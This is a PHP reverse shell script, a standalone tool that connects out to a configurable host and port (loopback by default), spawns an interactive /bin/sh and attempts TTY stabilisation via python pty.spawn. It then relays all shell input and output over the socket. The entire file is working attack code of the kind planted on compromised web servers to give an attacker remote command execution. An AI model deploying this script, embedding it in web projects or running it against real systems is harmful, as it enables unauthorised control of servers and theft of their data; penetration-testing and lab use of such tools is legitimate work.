<?php

    // AUTHOR: EVAN STELLA

    // CHANGE THE FOLLOWING PARAMS AS NEEDED:
    //---------------------------------------------------------------
    $addr = '127.0.0.1';   # shell destination (loopback for testing)
    $port = 5555;          # shell destination port
    $timeout = 20.0;       # connection timeout time (seconds):
    $shell = '/bin/sh -i'; # shell to run
    //---------------------------------------------------------------


    // open a socket to connect to host
    $socket = fsockopen($addr, $port, $errno, $errstr, $timeout);


    // check if connection successful
    if (!$socket) 
    {
        exit("UNABLE TO CONNECT TO HOST\n");
    }

    // notify host
    fwrite($socket, "[+] CONNECTION ESTABLISHED\n");


    // set socket to non-blocking
    stream_set_blocking($socket  , FALSE);


    // file descriptors
    $descriptorspec = array 
    (
        0 => array( "pipe", "r" ),  #stdin
        1 => array( "pipe", "w" ),  #stdout
        2 => array( "pipe", "w" )   #stderr
    );

    fwrite($socket, "[*] ATTEMPTING TO SPAWN SHELL\n");

    // get a shell
    $process = proc_open($shell, $descriptorspec, $pipes);


    // make sure we have a shell
    if ( !is_resource($process) )
    {
        fwrite($socket, "[-] FAILED TO SPAWN A SHELL ON TARGET\n");
        exit("FAILED TO SPAWN SHELL\n");
    }

    // notify host
    fwrite($socket, "[+] SHELL SPAWNED SUCCESSFULLY\n");


    // set data streams to non-blocking so they
    // don't wait for data when being read
    stream_set_blocking($pipes[0], FALSE);
    stream_set_blocking($pipes[1], FALSE);
    stream_set_blocking($pipes[2], FALSE);


    //attempt to stablize shell
    fwrite($socket, "[*] ATTEMPTING TO STABILIZE SHELL\n");

    if ( cmdExists("python") && cmdExists("bash") )
    {
        fwrite($pipes[0], "python -c 'import pty; pty.spawn(\"/bin/bash\")'");
        fwrite($socket, "[+] SHELL STABILIZED :: HIT 'ENTER'\n");
    }
    elseif ( cmdExists("python3") && cmdExists("bash") )
    {
        fwrite($pipes[0], "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'");
        fwrite($socket, "[+] SHELL STABILIZED :: HIT 'ENTER'\n");
    }
    elseif ( cmdExists("python") )
    {
        fwrite($pipes[0], "python -c 'import pty; pty.spawn(\"/bin/sh\")'");
        fwrite($socket, "[+] SHELL STABILIZED :: HIT 'ENTER'\n");
    }
    elseif ( cmdExists("python3") )
    {
        fwrite($pipes[0], "python3 -c 'import pty; pty.spawn(\"/bin/sh\")'");
        fwrite($socket, "[+] SHELL STABILIZED :: HIT 'ENTER'\n");
    }
    else 
    {
        fwrite($socket, "[-] UNABLE TO STABILIZE SHELL\n[-] TTY FUNCTIONALITY IS NOT AVAILABLE\n");
    }



    // now we've got a reverse shell.
    // handle io:
    while (TRUE) 
    {

        // check our connection to the host:
        // we've lost our shell if we've 
        // reached EOF on the socket or
        // or stdout pointers
        if ( feof($socket) || feof($pipes[1]) ) 
        {
            break;
        }

        // keeps track of the state of incoming 
        // data from the host, stdout, and stderr
        $traffic = array($socket, $pipes[1], $pipes[2]);
        // dummy variables because we only care about traffic
        $write = null; $except = null;
        // wait for traffic
        $changedStreams = stream_select($traffic,$write,$except,null);


        // incoming commands from host:
        if ( in_array($socket, $traffic) )
        {
            // get incomming command and send to stdin
            $command = fread($socket, 1500);
            fwrite($pipes[0], $command);
        }


        // outgoing messages from stdout
        if ( in_array($pipes[1], $traffic) )
        {
            // get outgoing message and send to host
            $message = fread($pipes[1], 1500);
            fwrite ($socket, $message);
        }


        // outgoing messages from stderr
        if ( in_array($pipes[2], $traffic) )
        {
            // get outgoing message and send to host
            $message = fread($pipes[2], 1500);
            fwrite ($socket, $message);
        }

    }

    // clean up nice
    fclose($socket);
    proc_close($process);


    //check if a command is runnable on the system
    function cmdExists ($cmd)
    {
        // attempt to execute, if returns false 
        // we know we can't run that command
        if ( !shell_exec("which $cmd") )
        {
            return false;
        }

        return true;
    }

?>
